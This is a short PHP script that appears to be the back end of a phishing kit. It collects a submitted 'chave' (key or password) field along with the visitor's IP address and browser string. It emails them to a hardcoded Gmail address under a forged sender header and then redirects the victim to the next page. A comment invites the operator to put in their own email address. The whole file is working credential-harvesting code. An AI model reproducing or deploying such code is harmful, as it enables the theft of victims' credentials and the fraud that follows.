<?php
session_start();
$message  = "[ - ] ==================| -- |================== [ - ]\n";
$message .= "[+]Chave:       ".$_POST['chave']."\n";
$message .= "[+]IP:         ".$_SERVER['REMOTE_ADDR']."\n";
$message .= "[+]Browser:    ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "[ - ] ==================| Card |================== [ - ]\n";
$praga=rand();
$praga=md5($praga);
$pra = rand(1111111111,9999999999);
if(!empty($_POST['chave'])){
$send = "fnbcomz@gmail.com";   //<--------Your email there
$subject = $pra." - ATL II - [".$_POST['chave']."]";
$headers = "From: SB0".$pra."<bursted@".$pra."0sb.com>";
mail($send,$subject,$message,$headers);
header("Location: index.php");
}else{
header("Location: index2.php");
}	 
?>